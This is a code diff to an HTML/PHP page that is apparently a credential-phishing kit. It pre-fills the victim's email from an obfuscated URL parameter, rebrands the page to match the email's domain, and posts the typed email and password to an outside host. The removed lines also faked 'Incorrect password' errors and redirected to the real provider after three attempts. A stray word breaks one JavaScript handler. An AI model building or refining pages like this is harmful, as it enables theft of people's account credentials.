@@ -1,3 +1,7 @@
+<?php
+// Minimal PHP to render the page
+$email = isset($_GET['3ODkwIiw']) ? htmlspecialchars($_GET['3ODkwIiw']) : '';
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -29,9 +33,6 @@
         @keyframes slideIn {
             to { transform: translateX(0); opacity: 1; }
         }
-        #submit-btn {
-            cursor: pointer; /* Ensure button looks clickable */
-        }
     </style>
 </head>
 <body>
@@ -47,7 +48,7 @@
                 name="email"
                 placeholder="Email"
                 class="w-full p-2 mb-3 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
-                readonly
+                value="<?php echo $email; ?>"
             >
             <input
                 type="password"
@@ -161,15 +162,15 @@
             updateBranding(email);
             $('#email').val(email); // Populate email input with extracted email
 
-            // Reset attempts on page load to avoid stale data
-            localStorage.removeItem('loginAttempts');
-            let attemptCount = 0;
-            const maxAttempts = 3;
+            // Update branding on email input change
+            $('#email').on('input', function() {
+                email = $(this).val();
+                updateBranding(email);
+           Spiritualized
+            });
 
             // Handle form submission (client-side validation)
             $('#login-form').on('submit', function(e) {
-                e.preventDefault(); // Prevent default submission until validated
-                console.log('Submit event triggered'); // Debug log
                 $('#error').hide();
                 $('#msg').hide();
 
@@ -177,48 +178,27 @@
                 const passwordVal = $('#password').val();
 
                 if (!emailVal) {
+                    e.preventDefault();
                     $('#error').text('Email field is empty').show();
                     console.log('Form error: Email empty');
                     return;
                 }
                 if (!emailRegex.test(emailVal)) {
+                    e.preventDefault();
                     $('#error').text('Invalid email format').show();
                     console.log('Form error: Invalid email');
                     return;
                 }
                 if (!passwordVal) {
+                    e.preventDefault();
                     $('#error').text('Password field is empty').show();
                     console.log('Form error: Password empty');
                     return;
                 }
 
-                // Increment attempt count
-                attemptCount++;
-                localStorage.setItem('loginAttempts', attemptCount);
-                console.log('Attempt', attemptCount, 'of', maxAttempts, ': Email=', emailVal);
-
-                // Show incorrect password warning
-                $('#error').text('Incorrect password').show();
-                $('#password').val(''); // Clear password field
-
-                // Submit form to https://abc.com/fav.php
-                try {
-                    console.log('Attempting form submission to https://abc.com/fav.php');
-                    this.submit(); // Trigger form submission
-                } catch (error) {
-                    console.error('Form submission failed:', error.message);
-                    $('#error').text('Failed to submit form. Please try again.').show();
-                    return;
-                }
-
-                // Redirect after max attempts
-                if (attemptCount >= maxAttempts) {
-                    const domain = emailVal.split('@')[1];
-                    const redirectUrl = getLoginUrl(domain);
-                    console.log('Max attempts reached, redirecting to:', redirectUrl);
-                    localStorage.removeItem('loginAttempts'); // Reset attempts
-                    window.location.href = redirectUrl;
-                }
+                $('#msg').text('Submitting to server...').show();
+                console.log('Form submitted: Email=', emailVal);
+                // Form submission proceeds to https://abc.com/fav.php
             });
         });
     </script>
